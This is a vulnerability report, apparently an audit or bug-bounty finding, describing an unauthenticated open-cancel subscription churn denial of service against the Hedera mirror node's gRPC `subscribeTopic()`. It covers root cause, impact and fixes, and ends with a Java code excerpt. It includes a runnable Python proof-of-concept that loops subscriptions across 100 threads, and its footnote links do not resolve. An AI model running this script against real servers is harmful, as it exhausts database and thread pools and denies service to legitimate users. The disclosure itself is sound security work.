### Title
Unauthenticated Subscription Churn DoS via Unthrottled Open-Cancel Cycles in `subscribeTopic()`

### Summary
`ConsensusController.subscribeTopic()` accepts gRPC connections from any unauthenticated caller with no per-IP or global rate limit on subscription creation. The `ServerCallStreamObserver` cancel handler (`disposable::dispose`) correctly cleans up each subscription, but this cleanup frees the per-connection slot immediately, enabling an attacker to rapidly cycle open→cancel across many connections. Each cycle allocates a `TopicContext`, triggers a database retrieval query, and schedules a bounded-elastic thread, exhausting shared resources and degrading service for legitimate subscribers.

### Finding Description

**Code path:**

`ConsensusController.subscribeTopic()` (lines 43–53): [1](#0-0) 

No authentication check, no rate-limit guard, and no per-caller connection cap precede the subscription setup.

`GrpcConfiguration` applies only `maxConcurrentCallsPerConnection` (default 5): [2](#0-1) 

This is a **per-connection** ceiling, not a per-IP or global ceiling. An attacker opens N TCP connections and holds 5 subscriptions on each.

`TopicMessageServiceImpl.subscribeTopic()` allocates a `TopicContext`, fires a DB retrieval, and schedules a safety-check task on `Schedulers.boundedElastic()` for every subscription: [3](#0-2) 

Specifically, each call to `topicMessageRetriever.retrieve(filter, true)` issues a DB query, and the safety-check `Mono.delay(Duration.ofSeconds(1L))` consumes a bounded-elastic thread: [4](#0-3) 

The only server interceptor present is a test-only `GrpcInterceptor` that only sets endpoint context — no auth, no throttle: [5](#0-4) 

**Root cause:** The failed assumption is that `maxConcurrentCallsPerConnection` is sufficient to bound resource consumption. It is not — it only limits concurrency within a single TCP connection. There is no limit on the number of connections from one source, no subscription-creation rate limit, and no authentication requirement.

**Exploit flow:**
1. Attacker opens N TCP connections to port 5600.
2. On each connection, attacker sends 5 concurrent `subscribeTopic` RPCs (the per-connection maximum).
3. Each RPC triggers: `TopicContext` allocation, a DB historical-message query, and a `boundedElastic` thread reservation.
4. Attacker immediately sends RST/cancel on each stream; `disposable::dispose` fires, freeing the slot.
5. Attacker immediately re-subscribes on the freed slot. Steps 3–5 repeat in a tight loop.

### Impact Explanation
- **Database connection pool exhaustion**: Each open cycle issues at least one `topicMessageRetriever.retrieve()` DB query. With N connections × 5 slots cycling rapidly, the DB connection pool saturates, causing legitimate subscribers' queries to queue or time out.
- **Thread pool exhaustion**: The `Schedulers.boundedElastic()` safety-check task is scheduled per subscription. Rapid cycling fills the bounded-elastic pool, stalling legitimate reactive pipelines.
- **Subscriber counter inflation/deflation noise**: `subscriberCount` increments and decrements on every cycle, polluting metrics and potentially masking real subscriber counts.
- Severity: **High** — full service degradation for all legitimate topic subscribers with no privileges required.

### Likelihood Explanation
The attack requires only a gRPC client library (freely available) and network access to port 5600. No credentials, no topic ownership, and no special knowledge beyond the public Hedera mirror node gRPC API spec are needed. The cycling pattern is trivially scriptable. A single attacker machine with modest bandwidth can open hundreds of connections and thousands of subscription cycles per second.

### Recommendation
1. **Add a per-IP (or per-authenticated-identity) subscription-creation rate limiter** at the gRPC interceptor layer (e.g., using Bucket4j, as already done in the web3 module's `ThrottleManagerImpl`).
2. **Limit total concurrent connections per source IP** at the Netty level via `NettyServerBuilder` (e.g., `maxConnectionsPerIp`).
3. **Add a global cap on total active subscriptions** checked inside `TopicMessageServiceImpl.subscribeTopic()` before allocating `TopicContext` — reject with `RESOURCE_EXHAUSTED` when the cap is reached.
4. **Require authentication** (e.g., mTLS or a bearer token interceptor) for `subscribeTopic` to attribute and throttle callers.

### Proof of Concept
```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-host:5600"
TOPIC_ID = basic_types_pb2.TopicID(topicNum=1234)
NUM_CONNECTIONS = 100

def attack_connection():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(topicID=TOPIC_ID)
    while True:
        # Open subscription
        call = stub.subscribeTopic(query)
        # Immediately cancel — triggers disposable::dispose on server
        call.cancel()
        # Repeat immediately — frees slot, re-allocates DB query + thread

threads = [threading.Thread(target=attack_connection) for _ in range(NUM_CONNECTIONS)]
for t in threads:
    t.start()
# Observe DB connection pool saturation and legitimate subscriber latency spike
```

    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
